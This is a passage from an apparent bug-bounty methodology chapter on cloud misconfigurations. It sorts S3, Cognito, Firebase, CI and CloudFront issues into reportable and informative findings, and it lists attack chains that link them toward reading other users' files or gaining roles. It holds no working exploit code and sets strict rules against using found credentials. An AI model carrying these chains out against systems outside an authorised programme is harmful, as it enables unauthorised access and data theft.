  origin IP or a Cloudflare bypass: 5 paid, median $100, top $375. CLD-013 is about the control the front door
  enforces and the origin skips, shown with the request the edge refused.
- **Open monitoring.** Grafana, Kibana, Prometheus, cAdvisor and Elasticsearch found open belong to CVE-008; filing
  them here duplicates it. Metrics alone pay little (#1697599, $100). `/version`, `/healthz` and `/api/health` are
  `version-disclosure`, and so are Jenkins banners and stack traces (#221989, #221833).
- **Cloud metadata reached through an SSRF.** It is SSR-003's finding, reported with the role name or the identity
  document; the credentials are never used.
- **Leaked cloud keys.** A key with no identity call (rotated, `AKIAIOSFODNN7EXAMPLE`, a fixture) is informative, and
  a key used for anything beyond the one identity call breaks every programme's rules. Keys from breach dumps and
  stealer logs are `leaked-credentials` and are never tried. Keys in env files, bundles and repositories are found by
  INF-002, INF-004 and INF-015; keys in images, artefacts and state files by CLD-011 and CLD-014.
- **A pre-signed URL that works for whoever holds it.** That is a bearer link. Lifetime alone is informative (SigV4
  caps it at seven days). An upload URL that takes an attacker-chosen key or content type is the upload chapter's.
- **A CI or registry login page.** "Exposed Jenkins" with only a login form, or `/v2/` answering 401, is
  informative. A runner registration token is reported unvalidated, because registering a runner takes real jobs and
  their secrets.
- **A workflow that "could be injected", with no reproduction.** Workflow-scanner output (`automated`), workflows in
  repositories the scope does not list, and injections that reach a job with no secrets and a read-only token.
- **Self sign-up where sign-up is public.** A customer pool that lets anyone register works as designed (CLD-006 is
  gated `!signup` for this reason).
- **CloudFront "The request could not be satisfied" on a dangling alternate domain.** The takeover chapter's
  (`takeover`), and CloudFront now requires a certificate covering a domain before a distribution can add it, so most
  of these cannot be claimed.
- **Bugs in the provider itself.** CloudTrail logging gaps, IAM evaluation quirks and console issues are the
  provider's own programme's (the AWS VDP rows of `kb/reports/cloud.md`), not the organisation's (`third-party`).
- **Spoofed mail from the organisation's domain** (#918243): `spf-dmarc`.
- **Duplicates.** Buckets referenced on the landing page and Firebase `/.json` on an app in scope for months have been
  requested by every scanner. Check them, and mark `dup-risk` unless the resource needed real recon to find.

## Chains

- CLD-001, CLD-003 → CLD-014 and CLD-011: state files and build outputs inside a listed bucket; every credential
  found gets one identity call. CLD-001 → CLD-002: a readable ACL granting `WRITE` or `FULL_CONTROL` is the write
  card's evidence.
- CLD-002 (a bucket the site loads scripts from) → XSS chapter: stored script on the asset's domain, proven with a
  new key, never by changing a served file.
- CLD-006 → CLD-008: the self-made user's ID token buys the identity pool's authenticated role. CLD-006 → BAC items,
  with the new user as attacker A.
- CLD-007 → AUT-013, AUT-014: an e-mail the application trusts without proof of control.
- CLD-001, CLD-004, CLD-005, CLD-008 → BAC-004: B's private files through a bucket grant, a signer, rules or a role.
- CLD-012 → CLD-011: image configuration and layers with credentials. CLD-012, CLD-009 → SSR-003: a pod or runner
  with the cloud metadata in reach (describe, never use).
- CLD-013 → injection chapters: a payload the WAF blocks, sent to the origin. CLD-013 → API-014: a stage that serves
  production data without its authoriser. CLD-013 → CLD-001: an S3 origin's name.
- CLD-010 → CLD-011: a privileged workflow that uploads artefacts or caches.
- INF-002, INF-004, INF-015 → this chapter: the bucket names, Firebase configurations and cloud keys they find.
- CVE-008 → CLD-009, CLD-012: an interface the one-request check finds open gets the full read-only test here.
- SSR-003 → CLD-008's rule: metadata credentials are described by role name, never used.
- CLD-004 → the upload chapter: a pre-signed upload that takes a chosen key or content type.

## Sources

- `kb/reports/cloud.md` and `kb/reports/all/cloud.md`: the disclosed reports this chapter is built from; title
  statistics computed from `kb/data/index.jsonl`.
- HexBrain: `get_program_history` for the programme's earlier bucket, Firebase and CI reports (duplicate check),
  `get_testing_playbook` for the class.
- AWS documentation: S3 ACL grantee groups (`AllUsers`, `AuthenticatedUsers`), Object Ownership and
  `bucket-owner-full-control`; Amazon Cognito user pools API reference (`SignUp`, `UpdateUserAttributes`, attribute
  read and write permissions, keeping the original attribute value while an update is pending); Cognito identity
  pools (enhanced flow, unauthenticated roles); API Gateway stages and disabling the default `execute-api` endpoint;
  CloudFront alternate domain names, signed URLs and signed cookies.
- Google documentation: Firebase Security Rules and the REST APIs of the Realtime Database, Cloud Firestore, Cloud
  Storage for Firebase and Identity Toolkit; Cloud Storage `testIamPermissions` and domain-named buckets; GKE's
  `system:authenticated` group.
- Azure documentation: anonymous read access to containers and blobs; shared access signature fields.
- Kubernetes documentation: kubelet authentication and authorisation, `SelfSubjectRulesReview`; etcd v3 gRPC gateway.
- GitHub Security Lab, "Keeping your GitHub Actions and workflows secure" (preventing pwn requests; untrusted input).
- HashiCorp Terraform documentation, "Sensitive data in state".
